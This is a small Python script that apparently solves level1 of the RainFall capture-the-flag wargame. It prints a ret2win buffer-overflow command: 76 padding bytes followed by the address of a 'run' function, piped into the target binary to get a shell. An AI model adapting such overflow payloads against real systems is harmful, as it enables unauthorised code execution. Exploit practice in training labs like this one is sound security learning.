#!/usr/bin/env python3
"""Level1: offset + address of run → ret2win command."""

try:
    from pwn import p32
except ImportError:
    def p32(x):
        return x.to_bytes(4, "little")

# RainFall: offset 76 (buffer + saved EBP up to ret)
OFFSET = 76
RUN_ADDR = 0x08048444

def main():
    run_le = p32(RUN_ADDR)
    cmd = (
        "( python -c 'print \"A\"*%d + \"\\x%02x\\x%02x\\x%02x\\x%02x\"'; cat ) | ./level1"
        % (OFFSET, run_le[0], run_le[1], run_le[2], run_le[3])
    )
    print(cmd)
    print("# offset =", OFFSET, ", run =", hex(RUN_ADDR))

if __name__ == "__main__":
    main()
